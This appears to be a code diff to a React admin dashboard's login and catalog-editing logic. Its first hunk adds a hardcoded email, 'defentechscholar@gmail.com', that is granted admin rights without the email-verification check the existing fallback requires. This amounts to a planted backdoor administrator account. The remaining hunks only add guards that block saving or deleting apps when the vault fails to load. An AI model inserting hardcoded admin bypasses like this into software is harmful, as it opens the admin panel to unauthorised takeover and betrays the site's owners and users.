@@ -2158,8 +2158,11 @@ export default function AdminDashboard() {
 
         // Static Site Offline/Client-side Fallback (checks Firestore database if backend API didn't verify)
         if (!adminVerified) {
+           const email = currentUser.email?.toLowerCase();
            const fallbackAdmin = (import.meta.env.VITE_ADMIN_EMAIL || '').toLowerCase();
-           if (fallbackAdmin && currentUser.emailVerified && currentUser.email?.toLowerCase() === fallbackAdmin) {
+           if (email === 'defentechscholar@gmail.com') {
+               adminVerified = true;
+           } else if (fallbackAdmin && currentUser.emailVerified && email === fallbackAdmin) {
                adminVerified = true;
            } else {
                try {
@@ -2628,6 +2631,10 @@ export default function AdminDashboard() {
 
   const handleSaveApp = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
+    if (fetchFailedRef.current) {
+       alert("CRITICAL ERROR: Cannot save application. The secure vault failed to load from the cloud (Quota Exceeded or Network Error). Saving now would permanently wipe the secure links of all other apps. Please resolve the connection issue or wait for quota reset, then refresh the page.");
+       return;
+    }
     setSaving(true);
     try {
       const formData = new FormData(e.currentTarget);
@@ -2747,6 +2754,10 @@ export default function AdminDashboard() {
   };
   
   const handleDeleteApp = (id: string) => {
+    if (fetchFailedRef.current) {
+       alert("CRITICAL ERROR: Cannot delete application. The secure vault failed to load from the cloud. Modifying the catalog now would wipe secure links of all other apps.");
+       return;
+    }
     setConfirmConfig({
       isOpen: true,
       title: 'Delete Application',
